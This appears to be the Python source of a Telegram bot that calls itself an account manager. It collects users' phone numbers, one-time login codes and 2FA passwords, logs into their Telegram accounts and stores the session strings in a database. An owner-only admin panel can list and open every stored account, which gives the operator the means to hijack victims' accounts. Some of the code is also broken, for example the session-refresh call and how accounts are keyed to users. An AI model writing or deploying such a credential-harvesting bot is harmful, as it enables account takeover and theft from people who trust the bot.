import os
import sqlite3
import asyncio
from datetime import datetime
from cryptography.fernet import Fernet
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ---------- ENVIRONMENT ----------
import dotenv
dotenv.load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "8745088070"))
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY")
if not all([BOT_TOKEN, API_ID, API_HASH, ENCRYPTION_KEY]):
    raise ValueError("Missing environment variables.")

cipher = Fernet(ENCRYPTION_KEY.encode())

# ---------- DATABASE ----------
DB_PATH = "sessions.db"

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                phone TEXT NOT NULL,
                username TEXT,
                first_name TEXT,
                status TEXT DEFAULT 'active',
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP,
                session_encrypted TEXT NOT NULL
            );
            CREATE INDEX IF NOT EXISTS idx_user_id ON accounts(user_id);
        """)
init_db()

# ---------- HELPERS ----------
def encrypt(data: str) -> str:
    return cipher.encrypt(data.encode()).decode()

def decrypt(data: str) -> str:
    return cipher.decrypt(data.encode()).decode()

def get_user_accounts(telegram_user_id):
    with get_db() as conn:
        rows = conn.execute("SELECT * FROM accounts WHERE user_id = ? ORDER BY added_date DESC", (telegram_user_id,)).fetchall()
    return [dict(r) for r in rows]

def get_all_accounts():
    with get_db() as conn:
        rows = conn.execute("SELECT * FROM accounts ORDER BY added_date DESC").fetchall()
    return [dict(r) for r in rows]

def get_account_by_id(account_id):
    with get_db() as conn:
        row = conn.execute("SELECT * FROM accounts WHERE id = ?", (account_id,)).fetchone()
    return dict(row) if row else None

def delete_account(account_id):
    with get_db() as conn:
        conn.execute("DELETE FROM accounts WHERE id = ?", (account_id,))

def update_last_active(account_id):
    with get_db() as conn:
        conn.execute("UPDATE accounts SET last_active = ? WHERE id = ?", (datetime.now(), account_id))

# ---------- CONVERSATION STATES ----------
PHONE, OTP, PASSWORD = range(3)

# ---------- MAIN MENU ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    context.user_data.clear()
    keyboard = [
        [InlineKeyboardButton("＋ Add Account", callback_data="add_acc")],
        [InlineKeyboardButton("◆ My Accounts", callback_data="my_acc")],
        [InlineKeyboardButton("⚙ Settings", callback_data="settings")],
    ]
    if user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("◆ Admin Panel", callback_data="admin_panel")])
    await update.message.reply_text(
        "⟡ 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦 ⟡\n\n◆ Manage your connected accounts",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ---------- ADD ACCOUNT CONVERSATION ----------
async def add_account_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "◆ Please enter your phone number with country code.\nExample: +91 9876543210"
    )
    return PHONE

async def add_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    context.user_data['phone'] = phone
    try:
        # Create temp client and request OTP
        client = TelegramClient('temp_' + phone, API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        context.user_data['phone_code_hash'] = result.phone_code_hash
        context.user_data['client'] = client  # keep for later
        await update.message.reply_text(
            "◆ OTP sent. Please enter the code you received:"
        )
        return OTP
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}\nPlease try again with /start")
        return ConversationHandler.END

async def add_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip()
    client = context.user_data.get('client')
    phone = context.user_data['phone']
    phone_code_hash = context.user_data['phone_code_hash']
    if not client:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        me = await client.get_me()
        session_str = client.session.save()
        encrypted = encrypt(session_str)
        with get_db() as conn:
            conn.execute(
                "INSERT INTO accounts (user_id, phone, username, first_name, status, added_date, last_active, session_encrypted) VALUES (?,?,?,?,?,?,?,?)",
                (me.id, phone, me.username or '', me.first_name or '', 'active', datetime.now(), datetime.now(), encrypted)
            )
        await client.disconnect()
        await update.message.reply_text("✅ Account added successfully!")
        return await start(update, context)
    except SessionPasswordNeededError:
        context.user_data['needs_2fa'] = True
        await update.message.reply_text("◆ 2FA is enabled. Please enter your password:")
        return PASSWORD
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        return ConversationHandler.END

async def add_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    client = context.user_data.get('client')
    phone = context.user_data['phone']
    if not client:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        session_str = client.session.save()
        encrypted = encrypt(session_str)
        with get_db() as conn:
            conn.execute(
                "INSERT INTO accounts (user_id, phone, username, first_name, status, added_date, last_active, session_encrypted) VALUES (?,?,?,?,?,?,?,?)",
                (me.id, phone, me.username or '', me.first_name or '', 'active', datetime.now(), datetime.now(), encrypted)
            )
        await client.disconnect()
        await update.message.reply_text("✅ Account added successfully!")
        return await start(update, context)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Operation cancelled.")
    return ConversationHandler.END

# ---------- MY ACCOUNTS ----------
async def my_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    accounts = get_user_accounts(user_id)
    if not accounts:
        await query.edit_message_text("◆ You have no connected accounts.")
        return
    keyboard = []
    for acc in accounts:
        keyboard.append([InlineKeyboardButton(
            f"📞 {acc['phone']}  ● {acc['status']}",
            callback_data=f"view_acc_{acc['id']}"
        )])
    keyboard.append([InlineKeyboardButton("↩ Back", callback_data="main_menu")])
    await query.edit_message_text(
        "⟡ 𝗬𝗢𝗨𝗥 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦 ⟡",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ---------- VIEW ACCOUNT DETAIL ----------
async def view_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    account_id = int(data.split("_")[2])
    account = get_account_by_id(account_id)
    if not account:
        await query.edit_message_text("Account not found.")
        return
    # Only owner of account or admin can view
    if account['user_id'] != update.effective_user.id and update.effective_user.id != OWNER_ID:
        await query.edit_message_text("Unauthorized.")
        return
    # Update last active
    update_last_active(account_id)
    text = (
        f"⟡ 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 ⟡\n\n"
        f"◆ User ID: {account['user_id']}\n"
        f"◆ Phone: {account['phone']}\n"
        f"◆ Username: @{account['username'] or '—'}\n"
        f"◆ First name: {account['first_name'] or '—'}\n"
        f"◆ Status: ● {account['status']}\n"
        f"◆ Added: {account['added_date'][:16]}\n"
        f"◆ Last active: {account['last_active'][:16] if account['last_active'] else '—'}"
    )
    keyboard = [
        [InlineKeyboardButton("↻ Refresh", callback_data=f"refresh_acc_{account_id}")],
        [InlineKeyboardButton("⌫ Logout", callback_data=f"delete_acc_{account_id}")],
        [InlineKeyboardButton("↩ Back", callback_data="my_acc")]
    ]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

# ---------- REFRESH ACCOUNT ----------
async def refresh_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    account_id = int(query.data.split("_")[2])
    account = get_account_by_id(account_id)
    if not account:
        await query.edit_message_text("Account not found.")
        return
    # Decrypt session and connect to update info
    try:
        session_str = decrypt(account['session_encrypted'])
        client = TelegramClient('refresh_' + str(account_id), API_ID, API_HASH)
        await client.connect()
        await client.sign_in(session_str)  # works with session string
        me = await client.get_me()
        # Update username, first_name, last_active
        with get_db() as conn:
            conn.execute(
                "UPDATE accounts SET username = ?, first_name = ?, last_active = ? WHERE id = ?",
                (me.username or '', me.first_name or '', datetime.now(), account_id)
            )
        await client.disconnect()
        await query.edit_message_text("✅ Account refreshed.")
        # Re-show details
        await view_account(update, context)
    except Exception as e:
        await query.edit_message_text(f"❌ Refresh error: {e}")

# ---------- DELETE ACCOUNT (LOGOUT) ----------
async def delete_account_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    account_id = int(query.data.split("_")[2])
    account = get_account_by_id(account_id)
    if not account:
        await query.edit_message_text("Account not found.")
        return
    # Permission check
    if account['user_id'] != update.effective_user.id and update.effective_user.id != OWNER_ID:
        await query.edit_message_text("Unauthorized.")
        return
    delete_account(account_id)
    await query.edit_message_text("⌫ Account data deleted.")
    # Go back to my accounts
    await my_accounts(update, context)

# ---------- ADMIN PANEL ----------
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if update.effective_user.id != OWNER_ID:
        await query.edit_message_text("Unauthorized.")
        return
    accounts = get_all_accounts()
    total = len(accounts)
    active = sum(1 for a in accounts if a['status'] == 'active')
    inactive = total - active
    text = (
        f"⟡ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 ⟡\n\n"
        f"◆ Total Accounts: {total}\n"
        f"◆ Active: {active}\n"
        f"◆ Inactive: {inactive}"
    )
    keyboard = []
    # Show first 10 accounts with view button
    for acc in accounts[:10]:
        keyboard.append([InlineKeyboardButton(
            f"📞 {acc['phone']}  ({acc['status']})",
            callback_data=f"view_acc_{acc['id']}"
        )])
    keyboard.append([InlineKeyboardButton("↩ Back", callback_data="main_menu")])
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

# ---------- SETTINGS (placeholder) ----------
async def settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "⚙ Settings\n\n◆ Warning limit: 3 warnings → auto‑mute\n◆ Encrypted sessions stored locally.\n◆ Admin: @owner",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩ Back", callback_data="main_menu")]])
    )

# ---------- MAIN MENU NAVIGATION ----------
async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await start(update, context)

# ---------- CONVERSATION HANDLER FOR ADD ACCOUNT ----------
conv_handler = ConversationHandler(
    entry_points=[CallbackQueryHandler(add_account_start, pattern="^add_acc$")],
    states={
        PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_phone)],
        OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_otp)],
        PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_password)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],
)

# ---------- MAIN ----------
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(my_accounts, pattern="^my_acc$"))
    app.add_handler(CallbackQueryHandler(admin_panel, pattern="^admin_panel$"))
    app.add_handler(CallbackQueryHandler(settings, pattern="^settings$"))
    app.add_handler(CallbackQueryHandler(main_menu, pattern="^main_menu$"))
    app.add_handler(CallbackQueryHandler(view_account, pattern="^view_acc_\\d+$"))
    app.add_handler(CallbackQueryHandler(refresh_account, pattern="^refresh_acc_\\d+$"))
    app.add_handler(CallbackQueryHandler(delete_account_cmd, pattern="^delete_acc_\\d+$"))
    app.run_polling()

if __name__ == "__main__":
    main()
